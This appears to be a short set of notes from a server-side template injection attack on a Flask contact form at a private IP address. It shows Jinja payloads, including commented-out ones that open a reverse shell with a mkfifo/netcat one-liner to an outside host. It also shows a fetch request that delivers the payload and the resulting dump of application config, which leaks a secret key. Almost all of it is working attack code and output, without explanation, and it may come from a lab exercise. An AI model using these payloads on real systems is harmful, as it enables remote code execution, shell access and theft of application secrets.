## Injection

```
// const atark = `{% if (__import__("subprocess").check_call)(['/bin/sh', '-c', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.1.0.88 9001 >/tmp/f']) %}true{% else %}false{% endif %}`
// const atark = `++-\{% for user in range(4) %}<b>Bold Text</b>{% endfor %}`
const atark = `{% for key, value in config.items() %}{% print(key) %} = {% print(value) %}{% print(" </br> ") %}{% endfor %}`
// (__import__("subprocess").check_call)(['/bin/sh', '-c', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.1.0.88 9001 >/tmp/f'])

await fetch("http://10.2.17.10/contact", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://10.2.17.10/contact",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": `name=${atark}&email=sdfdas<b>skdfjas</b></br>sljfslskdjf<br/>sldkfjs&telefonnummer=sdfdas<b>skdfjas</b></br>sljfslskdjf<br/>sldkfjs&freitext=sdfdas<b>skdfjas</b></br>sljfslskdjf<br/>sldkfjs`,
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

## Results (cleaned)

```
ENV = production
DEBUG = False
TESTING = False
PROPAGATE_EXCEPTIONS = None
PRESERVE_CONTEXT_ON_EXCEPTION = None
SECRET_KEY = P(OpoH98&/:\_LAaePUOO=)()wg::
PERMANENT_SESSION_LIFETIME = 31 days, 0:00:00
USE_X_SENDFILE = False
SERVER_NAME = None
APPLICATION_ROOT = /
SESSION_COOKIE_NAME = session
SESSION_COOKIE_DOMAIN = False
SESSION_COOKIE_PATH = None
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = False
SESSION_COOKIE_SAMESITE = None
SESSION_REFRESH_EACH_REQUEST = True
MAX_CONTENT_LENGTH = None
SEND_FILE_MAX_AGE_DEFAULT = None
TRAP_BAD_REQUEST_ERRORS = None
TRAP_HTTP_EXCEPTIONS = False
EXPLAIN_TEMPLATE_LOADING = False
PREFERRED_URL_SCHEME = http
JSON_AS_ASCII = True
JSON_SORT_KEYS = True
JSONIFY_PRETTYPRINT_REGULAR = False
JSONIFY_MIMETYPE = application/json
TEMPLATES_AUTO_RELOAD = None
MAX_COOKIE_SIZE = 4093
```
